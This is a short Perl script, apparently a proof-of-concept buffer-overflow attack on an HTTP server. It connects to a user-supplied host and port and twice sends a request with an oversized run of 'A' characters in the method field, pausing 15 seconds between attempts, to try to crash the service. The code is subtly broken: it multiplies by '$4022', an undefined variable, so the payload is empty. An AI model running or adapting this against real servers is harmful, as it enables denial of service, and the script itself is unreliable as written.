#!/usr/bin/perl
use IO::Socket;
  if (@ARGV < 2)  {
     print "Usage: host port\n";
     exit;
   }
$overflow = "A" x $4022;
&connect;
sleep(15);
&connect;
exit;
################################################
sub connect() {
  $sock= IO::Socket::INET->new(Proto=>"TCP",
			     PeerAddr=>$ARGV[0],
			     PeerPort=>"$ARGV[1]",)
			     or die "Cant connect to $ARGV[0]: $!\n";
  $sock->autoflush(1);
  print $sock "$overflow /index.html HTTP/1.0\n\n";
  $response=<$sock>;
  print "$response";
  while(<$sock>){
     print "$_\n";
  }
  close $sock;
}
